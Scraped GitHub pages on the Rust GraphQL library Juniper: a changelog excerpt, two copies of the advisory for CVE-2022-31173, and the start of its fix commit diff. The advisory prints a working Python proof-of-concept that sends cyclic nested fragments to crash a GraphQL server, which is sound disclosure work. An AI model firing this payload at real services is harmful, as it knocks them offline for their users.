      registry.build_object_type::<Self>(fields).into_meta()
  }
  ```

### Added

* Support for different contexts for different types. As GraphQL
  schemas tend to get large, narrowing down the context type to
  exactly what a given type needs is great for
  encapsulation. Similarly, letting different subsystems use different
  resources thorugh the context is also useful for the same reasons.

  Juniper supports two different methods of doing this, depending on
  your needs: if you have two contexts where one can be converted into
  the other *without any extra knowledge*, you can implement the new
  `FromContext` trait. This is useful if you have multiple crates or
  modules that all belong to the same GraphQL schema:

  ```
  struct TopContext {
    db: DatabaseConnection,
    session: WebSession,
    current_user: User,
  }

  struct ModuleOneContext {
    db: DatabaseConnection, // This module only requires a database connection
  }

  impl Context for TopContext {}
  impl Context for ModuleOneContext {}

  impl FromContext<TopContext> for ModuleOneContext {
    fn from(ctx: &TopContext) -> ModuleOneContext {
      ModuleOneContext {
        db: ctx.db.clone()
      }
    }
  }

  graphql_object!(Query: TopContext |&self| {
    field item(&executor) -> Item {
      executor.context().db.get_item()
    }
  });

  // The `Item` type uses another context type - conversion is automatic
  graphql_object!(Item: ModuleOneContext |&self| {
    // ...
  });
  ```

  The other way is to manually perform the conversion in a field
  resolver. This method is preferred when the child context needs
  extra knowledge than what exists in the parent context:

  ```
  // Each entity has its own context
  struct TopContext {
    entities: HashMap<i32, EntityContext>,
    db: DatabaseConnection,
  }

  struct EntityContext {
    // fields
  }

  impl Context for TopContext {}
  impl Context for EntityContext {}

  graphql_object!(Query: TopContext |&self| {
    // By returning a tuple (&Context, GraphQLType), you can tell the executor
    // to switch out the context for the returned value. You can wrap the
    // tuple in Option<>, FieldResult<>, FieldResult<Option<>>, or just return
    // the tuple without wrapping it.
    field entity(&executor, key: i32) -> Option<(&EntityContext, Entity)> {
      executor.context().entities.get(&key)
        .map(|ctx| (ctx, executor.context().db.get_entity(key)))
    }
  });

  graphql_object!(Entity: EntityContext |&self| {
    // ...
  });
  ```

### Improvements

* Parser and query execution has now reduced the allocation overhead
  by reusing as much as possible from the query source and meta type
  information.

# [0.5.3](https://github.com/graphql-rust/juniper/compare/0.5.2...0.5.3) – 2016-12-05

### Added

* `jtry!`: Helper macro to produce `FieldResult`s from regular
  `Result`s. Wherever you would be using `try!` in a regular function
  or method, you can use `jtry!` in a field resolver:

  ```
  graphql_object(MyType: Database |&self| {
    field count(&executor) -> FieldResult<i32> {
      let txn = jtry!(executor.context().transaction());

      let count = jtry!(txn.execute("SELECT COUNT(*) FROM user"));

      Ok(count[0][0])
    }
  });
  ```

### Changes

* Relax context type trait requirements for the iron handler: your
  contexts no longer have to be `Send + Sync`.
* `RootNode` is now `Send` and `Sync` if both the mutation and query
  types implement `Send` and `Sync`.

### Bugfixes

* `return` statements inside field resolvers no longer cause syntax
  errors.

## 0.5.2 – 2016-11-13

### Added

* Support for marking fields and enum values deprecated.
* `input_object!` helper macro

### Changes

* The included example server now uses the simple Star Wars schema
  used in query/introspection tests.

### Bugfixes

* The query validators - particularly ones concerned with validation
  of input data and variables - have been improved significantly. A
  large number of test cases have been added.
* Macro syntax stability has also been improved. All syntactical edge
  cases of the macros have gotten tests to verify their correctness.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_bce514c4_20250108_154420.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fadvisories%2FGHSA-4rx6-g5vg-5f3j)

**CVE-2022-31173**

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fadvisories%2FGHSA-4rx6-g5vg-5f3j)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2Fadvisories%2F%3Cid%3E&source=header)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

1. [GitHub Advisory Database](/advisories)
2. [GitHub Reviewed](/advisories?query=type%3Areviewed)
3. [CVE-2022-31173](/advisories/GHSA-4rx6-g5vg-5f3j)

## Juniper is vulnerable to @DOS GraphQL Nested Fragments overflow

High severity

GitHub Reviewed

Published
Jul 28, 2022
in
[graphql-rust/juniper](/graphql-rust/juniper)
•
Updated Jul 24, 2023

[Vulnerability details](/advisories/GHSA-4rx6-g5vg-5f3j)
[Dependabot alerts
0](/advisories/GHSA-4rx6-g5vg-5f3j/dependabot)

## Package

cargo

juniper
([Rust](/advisories?query=ecosystem%3Arust))

## Affected versions

< 0.15.10

## Patched versions

0.15.10

## Description

### GraphQL behaviour

Nested fragment in GraphQL might be quite hard to handle depending on the implementation language.

Some language support natively a max recursion depth. However, on most compiled languages, you should add a threshold of recursion.

```
# Infinite loop example
query {
    ...a
}

fragment a on Query {
    ...b
}

fragment b on Query {
    ...a
}
```
### POC TLDR

With max\_size being the number of nested fragment generated.

At max\_size=7500, it should instantly raise:

[![](https://camo.githubusercontent.com/46ff95b141505b49aee128f296cb9f1b0ebf3eb0ff967a3c1543a97f47db14d3/68747470733a2f2f692e696d6775722e636f6d2f7758625578386c2e706e67)](https://camo.githubusercontent.com/46ff95b141505b49aee128f296cb9f1b0ebf3eb0ff967a3c1543a97f47db14d3/68747470733a2f2f692e696d6775722e636f6d2f7758625578386c2e706e67)

However, with a lower size, you will overflow the memory after some iterations.

### Reproduction steps (Juniper)

```
git clone https://github.com/graphql-rust/juniper.git
cd juniper

```

Save this POC as poc.py

```
import requests
import time
import json
from itertools import permutations

print('=== Fragments POC ===')

url = 'http://localhost:8080/graphql'

max_size = 7500
perms = [''.join(p) for p in permutations('abcefghijk')]
perms = perms[:max_size]

fragment_payloads = ''
for i, perm in enumerate(perms):
    next_perm = perms[i+1] if i < max_size-1 else perms[0]
    fragment_payloads += f'fragment {perm} on Query' + '{' f'...{next_perm}' + '}'

payload = {'query':'query{\n  ...' + perms[0] + '\n}' + fragment_payloads,'variables':{},'operationName':None}

headers = {
  'Content-Type': 'application/json',
}

try:
    response = requests.request('POST', url, headers=headers, json=payload)
    print(response.text)
except requests.exceptions.ConnectionError:
    print('Connection closed, POC worked.')
```
```
cargo run
[in separate shell] python3 poc.py

```
### Credits

[@Escape-Technologies](https://escape.tech)

@c3b5aw

[@MdotTIM](https://github.com/MdotTIM)

[@karimhreda](https://github.com/karimhreda)

### References

* [GHSA-4rx6-g5vg-5f3j](https://github.com/graphql-rust/juniper/security/advisories/GHSA-4rx6-g5vg-5f3j "GHSA-4rx6-g5vg-5f3j")
* [graphql-rust/juniper@2b609ee](https://github.com/graphql-rust/juniper/commit/2b609ee057be950e3454b69fadc431d120e407bb)
* [graphql-rust/juniper@8d28cdb](https://github.com/graphql-rust/juniper/commit/8d28cdba6eb10f53490ba41d1b5cb40506c2de22)
* <https://github.com/graphql-rust/juniper/blob/juniper-v0.15.10/juniper/CHANGELOG.md#01510-2022-07-28>
* <https://nvd.nist.gov/vuln/detail/CVE-2022-31173>
* <https://rustsec.org/advisories/RUSTSEC-2022-0038.html>

[![@tyranron](https://avatars.githubusercontent.com/u/7114909?s=40&v=4)](/tyranron)
[tyranron](/tyranron)
published to
[graphql-rust/juniper](/graphql-rust/juniper/security/advisories/GHSA-4rx6-g5vg-5f3j)
Jul 28, 2022

Published to the GitHub Advisory Database
Jul 29, 2022

Reviewed
Jul 29, 2022

Published by the [National Vulnerability Database](https://nvd.nist.gov/vuln/detail/CVE-2022-31173)
Aug 1, 2022

Last updated
Jul 24, 2023

### Severity

High

7.5

# CVSS overall score

 This score calculates overall vulnerability severity from 0 to 10 and is based on the Common Vulnerability Scoring System (CVSS).

 / 10

#### CVSS v3 base metrics

Attack vector
Network

Attack complexity
Low

Privileges required
None

User interaction
None

Scope
Unchanged

Confidentiality
None

Integrity
None

Availability
High

Learn more about base metrics

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H

### [EPSS score](https://www.first.org/epss/user-guide)

0.261%
 (65th percentile)

### Weaknesses

[CWE-400](/advisories?query=cwe%3A400) [CWE-674](/advisories?query=cwe%3A674)

### CVE ID

CVE-2022-31173

### GHSA ID

GHSA-4rx6-g5vg-5f3j

### Source code

[graphql-rust/juniper](https://github.com/graphql-rust/juniper)

### Credits

* [![@MdotTIM](https://avatars.githubusercontent.com/u/32790920?s=40&v=4)](/MdotTIM)
  [MdotTIM](/MdotTIM)
  Analyst
* [![@karimhreda](https://avatars.githubusercontent.com/u/44377062?s=40&v=4)](/karimhreda)
  [karimhreda](/karimhreda)
  Analyst
* [![@nullswan](https://avatars.githubusercontent.com/u/7050552?s=40&v=4)](/nullswan)
  [nullswan](/nullswan)
  Analyst

 Loading

Checking history

See something to contribute?
[Suggest improvements for this vulnerability](/advisories/GHSA-4rx6-g5vg-5f3j/improve).

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_58bef09d_20250108_125400.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fgraphql-rust%2Fjuniper%2Fsecurity%2Fadvisories%2FGHSA-4rx6-g5vg-5f3j)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fgraphql-rust%2Fjuniper%2Fsecurity%2Fadvisories%2FGHSA-4rx6-g5vg-5f3j)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&source=header-repo&source_repo=graphql-rust%2Fjuniper)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[graphql-rust](/graphql-rust)
/
**[juniper](/graphql-rust/juniper)**
Public

* [Notifications](/login?return_to=%2Fgraphql-rust%2Fjuniper) You must be signed in to change notification settings
* [Fork
  428](/login?return_to=%2Fgraphql-rust%2Fjuniper)
* [Star
   5.7k](/login?return_to=%2Fgraphql-rust%2Fjuniper)

* [Code](/graphql-rust/juniper)
* [Issues
  88](/graphql-rust/juniper/issues)
* [Pull requests
  16](/graphql-rust/juniper/pulls)
* [Discussions](/graphql-rust/juniper/discussions)
* [Actions](/graphql-rust/juniper/actions)
* [Security](/graphql-rust/juniper/security)
* [Insights](/graphql-rust/juniper/pulse)

Additional navigation options

* [Code](/graphql-rust/juniper)
* [Issues](/graphql-rust/juniper/issues)
* [Pull requests](/graphql-rust/juniper/pulls)
* [Discussions](/graphql-rust/juniper/discussions)
* [Actions](/graphql-rust/juniper/actions)
* [Security](/graphql-rust/juniper/security)
* [Insights](/graphql-rust/juniper/pulse)

# DOS GraphQL Nested Fragments overflow

High

[tyranron](/tyranron)
published
GHSA-4rx6-g5vg-5f3j
Jul 28, 2022

## Package

cargo

juniper
([Rust](/advisories?query=ecosystem%3Arust))

## Affected versions

<= 0.15.9

## Patched versions

0.15.10

## Description

### GraphQL behaviour

Nested fragment in GraphQL might be quite hard to handle depending on the implementation language.

Some language support natively a max recursion depth. However, on most compiled languages, you should add a threshold of recursion.

```
# Infinite loop example
query {
    ...a
}

fragment a on Query {
    ...b
}

fragment b on Query {
    ...a
}
```
### POC TLDR

With max\_size being the number of nested fragment generated.

At max\_size=7500, it should instantly raise:

[![](https://camo.githubusercontent.com/46ff95b141505b49aee128f296cb9f1b0ebf3eb0ff967a3c1543a97f47db14d3/68747470733a2f2f692e696d6775722e636f6d2f7758625578386c2e706e67)](https://camo.githubusercontent.com/46ff95b141505b49aee128f296cb9f1b0ebf3eb0ff967a3c1543a97f47db14d3/68747470733a2f2f692e696d6775722e636f6d2f7758625578386c2e706e67)

However, with a lower size, you will overflow the memory after some iterations.

### Reproduction steps (Juniper)

```
git clone https://github.com/graphql-rust/juniper.git
cd juniper

```

Save this POC as poc.py

```
import requests
import time
import json
from itertools import permutations

print('=== Fragments POC ===')

url = 'http://localhost:8080/graphql'

max_size = 7500
perms = [''.join(p) for p in permutations('abcefghijk')]
perms = perms[:max_size]

fragment_payloads = ''
for i, perm in enumerate(perms):
    next_perm = perms[i+1] if i < max_size-1 else perms[0]
    fragment_payloads += f'fragment {perm} on Query' + '{' f'...{next_perm}' + '}'

payload = {'query':'query{\n  ...' + perms[0] + '\n}' + fragment_payloads,'variables':{},'operationName':None}

headers = {
  'Content-Type': 'application/json',
}

try:
    response = requests.request('POST', url, headers=headers, json=payload)
    print(response.text)
except requests.exceptions.ConnectionError:
    print('Connection closed, POC worked.')
```

```
cargo run
[in separate shell] python3 poc.py

```
### Credits

[@Escape-Technologies](https://escape.tech)

@c3b5aw

[@MdotTIM](https://github.com/MdotTIM)

[@karimhreda](https://github.com/karimhreda)

### Severity

High

7.5

# CVSS overall score

 This score calculates overall vulnerability severity from 0 to 10 and is based on the Common Vulnerability Scoring System (CVSS).

 / 10

#### CVSS v3 base metrics

Attack vector
Network

Attack complexity
Low

Privileges required
None

User interaction
None

Scope
Unchanged

Confidentiality
None

Integrity
None

Availability
High

Learn more about base metrics

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H

### CVE ID

CVE-2022-31173

### Weaknesses

[CWE-674](/advisories?query=cwe%3A674)

### Credits

* [![@MdotTIM](https://avatars.githubusercontent.com/u/32790920?s=40&v=4)](/MdotTIM)
  [MdotTIM](/MdotTIM)
  Analyst
* [![@karimhreda](https://avatars.githubusercontent.com/u/44377062?s=40&v=4)](/karimhreda)
  [karimhreda](/karimhreda)
  Analyst
* [![@nullswan](https://avatars.githubusercontent.com/u/7050552?s=40&v=4)](/nullswan)
  [nullswan](/nullswan)
  Analyst

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_f4a11349_20250108_125359.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fgraphql-rust%2Fjuniper%2Fcommit%2F8d28cdba6eb10f53490ba41d1b5cb40506c2de22)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fgraphql-rust%2Fjuniper%2Fcommit%2F8d28cdba6eb10f53490ba41d1b5cb40506c2de22)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=graphql-rust%2Fjuniper)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[graphql-rust](/graphql-rust)
/
**[juniper](/graphql-rust/juniper)**
Public

* [Notifications](/login?return_to=%2Fgraphql-rust%2Fjuniper) You must be signed in to change notification settings
* [Fork
  428](/login?return_to=%2Fgraphql-rust%2Fjuniper)
* [Star
   5.7k](/login?return_to=%2Fgraphql-rust%2Fjuniper)

* [Code](/graphql-rust/juniper)
* [Issues
  88](/graphql-rust/juniper/issues)
* [Pull requests
  16](/graphql-rust/juniper/pulls)
* [Discussions](/graphql-rust/juniper/discussions)
* [Actions](/graphql-rust/juniper/actions)
* [Security](/graphql-rust/juniper/security)
* [Insights](/graphql-rust/juniper/pulse)

Additional navigation options

* [Code](/graphql-rust/juniper)
* [Issues](/graphql-rust/juniper/issues)
* [Pull requests](/graphql-rust/juniper/pulls)
* [Discussions](/graphql-rust/juniper/discussions)
* [Actions](/graphql-rust/juniper/actions)
* [Security](/graphql-rust/juniper/security)
* [Insights](/graphql-rust/juniper/pulse)

## Commit

[Permalink](/graphql-rust/juniper/commit/8d28cdba6eb10f53490ba41d1b5cb40506c2de22)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

Backport [CVE-2022-31173](https://github.com/advisories/GHSA-4rx6-g5vg-5f3j "CVE-2022-31173") fix from [GHSA-4rx6-g5vg-5f3j](https://github.com/advisories/GHSA-4rx6-g5vg-5f3j "GHSA-4rx6-g5vg-5f3j")

[Browse files](/graphql-rust/juniper/tree/8d28cdba6eb10f53490ba41d1b5cb40506c2de22)
Browse the repository at this point in the history

```
Co-authored-by: ilslv <ilya.solovyiov@gmail.com>
```

* Loading branch information

[![@tyranron](https://avatars.githubusercontent.com/u/7114909?s=40&v=4)](/tyranron) [![@ilslv](https://avatars.githubusercontent.com/u/47687266?s=40&v=4)](/ilslv)

[tyranron](/graphql-rust/juniper/commits?author=tyranron "View all commits by tyranron")
and
[ilslv](/graphql-rust/juniper/commits?author=ilslv "View all commits by ilslv")
committed
Jul 28, 2022

1 parent
[c650713](/graphql-rust/juniper/commit/c6507139978253530a72f0612e3d56e48c8cb918)

commit 8d28cdb

 Show file tree

 Hide file tree

Showing
**10 changed files**
with
**297 additions**
and
**102 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* integration\_tests/juniper\_tests

  + integration\_tests/juniper\_tests/Cargo.toml
    [Cargo.toml](#diff-39918bc60855b60cfee995f367628721840157d1b3b3b09582a1fc8e71482ca1)
  + src

    - integration\_tests/juniper\_tests/src/cve\_2022\_31173.rs
      [cve\_2022\_31173.rs](#diff-41969224e494071be224af3a0e5943271fc0f879b04560e8f78ac46ad9585af0)
    - integration\_tests/juniper\_tests/src/lib.rs
      [lib.rs](#diff-4ad41a02d7b1d170160f0252aa32d34b6f1dbab12fa6e6efcdcb3d0775bb04ca)
* juniper

  + juniper/CHANGELOG.md
    [CHANGELOG.md](#diff-6e591d4f55450a1579720827f9844ed8d6b05516a388f1f1bde78a4f5d6aeb7a)
  + src/validation/rules

    - juniper/src/validation/rules/no\_fragment\_cycles.rs
      [no\_fragment\_cycles.rs](#diff-ef817e12ae1ad013bfe9fda33c4348f962ea89f05632000d9054366bd28b5836)
    - juniper/src/validation/rules/no\_undefined\_variables.rs
      [no\_undefined\_variables.rs](#diff-e24aa0fa8ab9f5b91ad784c50242ff9331d76f6fff074f7df4ae5304b9fbe40a)
    - juniper/src/validation/rules/no\_unused\_fragments.rs
      [no\_unused\_fragments.rs](#diff-033339124f4e8d264c74a163f6d9e753b378964fd9fb72814c928c4bd9f14dbe)
    - juniper/src/validation/rules/no\_unused\_variables.rs
      [no\_unused\_variables.rs](#diff-73ea1541d9b2224e1a56368379132953f9036c62abb9f75bf711d92ecdae0942)
    - juniper/src/validation/rules/overlapping\_fields\_can\_be\_merged.rs
      [overlapping\_fields\_can\_be\_merged.rs](#diff-03ebf047e5722283203e3a12691427234020240b7f3fb5b4a8f51b7b273cb127)
    - juniper/src/validation/rules/variables\_in\_allowed\_position.rs
      [variables\_in\_allowed\_position.rs](#diff-3fb84106122d28e1a824d2fd07980c3288b2085094f8beb5bf935b3ca473e3d6)

## There are no files selected for viewing

1 change: 1 addition & 0 deletions

1
[integration\_tests/juniper\_tests/Cargo.toml](#diff-39918bc60855b60cfee995f367628721840157d1b3b3b09582a1fc8e71482ca1 "integration_tests/juniper_tests/Cargo.toml")

Show comments

[View file](/graphql-rust/juniper/blob/8d28cdba6eb10f53490ba41d1b5cb40506c2de22/integration_tests/juniper_tests/Cargo.toml)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -7,6 +7,7 @@ publish = false |
|  |  | [dependencies] |
|  |  | derive\_more = "0.99" |
|  |  | futures = "0.3" |
|  |  | itertools = "0.10" |
